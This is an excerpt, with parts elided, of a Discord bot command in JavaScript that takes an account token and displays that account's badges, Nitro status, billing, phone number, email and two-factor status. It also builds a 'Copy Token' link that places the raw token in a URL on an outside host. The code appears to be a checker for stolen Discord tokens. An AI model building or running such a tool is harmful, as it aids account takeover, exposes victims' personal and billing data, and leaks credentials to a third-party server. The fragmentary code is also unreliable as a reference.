...
module.exports.run = async (client, message, args) => {
  let token = args[0];
  if (!token) return message.channel.send(`Invalid arguments! Use: ${client.config.bot.prefix}info <token>`);
  let json;
  ...
  const badges = {
    ...
    Early_Verified_client_Developer: {
        Value: 131072,
...
function getUserNitro(flags) {
  ...
  .setDescription(`<:LLX404:978378846346813562> **Token:**\n\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`)
  .addField("<:LLX404:978378846858539068> Badges:", `${getBadges(json.flags)} ${await getNitro(json.premium_type, json.id, token)}`)
  .addField("<:LLX404:978378846808203274> Nitro Type:", `${getUserNitro(json.premium_type)}`)
  .addField("<:LLX404:978378847487660092> Billing:", `${billing}`)
  .addField("<:LLX404:978378846611075072> Phone:", `\`${json.phone || "No Phone"}\``)
  .addField("<:LLX404:978378846632046652> Email:", `\`${json.email}\``)
  .addField("<:LLX404:978378846476836865> 2FA Enabled:", `\`${json.mfa_enabled ? "Yes" : "No"}\``)
